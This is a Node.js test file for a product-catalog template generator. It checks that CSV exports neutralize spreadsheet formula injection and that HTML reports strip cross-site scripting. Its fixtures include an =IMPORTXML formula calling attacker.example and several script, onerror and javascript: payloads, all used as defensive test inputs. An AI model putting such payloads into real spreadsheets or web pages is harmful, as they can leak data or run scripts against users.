import assert from "node:assert/strict";
import test from "node:test";
import { buildErrorsCSV, buildOutputCSV, buildOutputHTML, generateProductTemplateResult } from "../lib/generation/template-generator";

test("CSV exports neutralize spreadsheet formulas from source and AI fields", () => {
  const row = generateProductTemplateResult({
    sku: "=IMPORTXML(\"https://attacker.example\",\"//x\")",
    nombre_producto: "+SUM(1,2)",
    marca: "@evil",
    categoria: "Hardware",
    precio: "-10",
    imagen_url: "https://cdn.example/p.jpg",
    caracteristicas: "Datos técnicos suficientes para generar una salida de prueba.",
  });

  const csv = buildOutputCSV([row], "Shopify");
  assert.match(csv, /"'=IMPORTXML/);
  assert.match(csv, /"'\+SUM\(1,2\)/);
  assert.match(csv, /"'@evil"/);
  assert.match(csv, /"'-10"/);

  const errors = buildErrorsCSV([{ row_index: 1, sku: "=IMPORTXML(\"x\",\"y\")", nombre_producto: "@bad", error_message: "+boom" }]);
  assert.match(errors, /"'=IMPORTXML/);
  assert.match(errors, /"'@bad"/);
  assert.match(errors, /"'\+boom"/);
  assert.match(buildOutputCSV([{ ...row, sku: "\t=SUM(1,1)", seo_product_name: "Normal text" }], "Shopify"), /"'\t=SUM/);
  assert.match(buildOutputCSV([{ ...row, sku: "\n=SUM(1,1)", seo_product_name: "Normal text" }], "Shopify"), /"'\n=SUM/);
});

test("HTML reports escape text fields and strip dangerous HTML from long descriptions", () => {
  const row = generateProductTemplateResult({
    sku: "SKU-HTML",
    nombre_producto: "<img src=x onerror=alert(1)>",
    categoria: "General",
    descripcion_actual: "<script>alert(1)</script><p onclick=alert(1)>Texto seguro</p><svg onload=alert(1)></svg>",
    caracteristicas: "Características suficientes para generar contenido.",
  });
  row.seo_product_name = "<script>alert('title')</script>Producto";
  row.long_description_html = "<script>alert(1)</script><p onclick=alert(1)>Texto seguro</p><svg onload=alert(1)></svg><a href=\"javascript:alert(1)\">link</a>";

  const html = buildOutputHTML([row], { id: "JOB<script>", original_filename: "<script>file</script>.csv", platform: "generic" });
  assert.doesNotMatch(html, /<script/i);
  assert.doesNotMatch(html, /onerror|onclick|onload|javascript:/i);
  assert.doesNotMatch(html, /<svg/i);
  assert.match(html, /&lt;script&gt;alert/);
  assert.match(html, /<p>Texto seguro<\/p>/);
});
